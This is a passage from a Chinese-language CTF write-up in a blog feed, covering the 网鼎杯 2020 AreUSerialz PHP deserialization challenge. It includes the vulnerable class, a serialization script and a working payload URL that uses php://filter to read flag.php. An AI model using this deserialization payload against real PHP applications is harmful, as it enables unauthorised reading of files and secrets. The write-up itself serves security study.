class="string">&quot;1&quot;</span>;        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)  </span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下<br>GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化<br>在反序列化的过程中，调用__destruct析构方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)            </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;        </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;        </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>op===&quot;2&quot;</code> ，将其赋为”1”，同时content赋为空，进入process函数，需要注意到的地方是，这里op与”2”比较的时候是强类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入process函数后，如果<code>op==&quot;1&quot;</code> 那么进入write函数，若<code>op==&quot;2&quot;</code> ,则进入write函数，否则输出报错，可以看出来这里op与字符串的比较变成了若比较类型&#x3D;&#x3D;<br>所以我们之哦呀哦令<code>op==2</code> ,这里2是整数int.当op&#x3D;2时,<code>op===&quot;2&quot;</code> 为flase<br><code>op==&quot;2&quot;</code> 为true,接着进入read函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">    $res = &quot;&quot;;</span><br><span class="line">    if(isset($this-&gt;filename)) &#123;</span><br><span class="line">        $res = file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    return $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　filename是我们可以控制的，接着使用file_get_contents函数读取文件，我们此处借助php:&#x2F;&#x2F;filter伪协议读取文件，获取到文件后使用output函数输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private function output($s) &#123;</span><br><span class="line">    echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">    echo $s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个利用思路就很明显了，还有一个需要注意的地方是，<img src="https://cdn.nlark.com/yuque/__latex/3a34f211545527dce51588d937decc6b.svg" alt="img">filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="number">2</span>;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;  </span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;  </span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;  </span><br><span class="line">        <span class="comment">// $this-&gt;process();  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;  </span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;  </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;  </span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);  </span><br><span class="line">                <span class="keyword">die</span>();  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);  </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);  </span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;  </span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;  </span><br><span class="line">        <span class="comment">// $this-&gt;process();  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();  </span><br><span class="line"><span class="variable">$B</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$B</span>;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435764763-255f38aa-4c8a-4b07-8453-35c355673339.png" alt="null"></p><p> 在这里有几种绕过的方式，简单的一种是：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p><p>即:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public $op=2;</span><br><span class="line">public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">public $content;</span><br></pre></td></tr></table></figure><p>现在得到的结果就没有%00字符了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435764823-07654be8-e9b6-463b-a6c8-ebfd4b2e0d42.png" alt="null"></p><p>得到payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435764890-852ca35d-d3b7-4592-a250-244e8690e317.png" alt="null"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;网鼎杯-2020-青龙组–AreUSerialz&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-青龙组–AreUSerialz&quot; class=&quot;headerlink&quot; title=&quot;网鼎杯 2020 青龙组–AreUSerialz&quot;&gt;&lt;/a&gt;网鼎杯 2020 青龙组–AreUSerialz&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
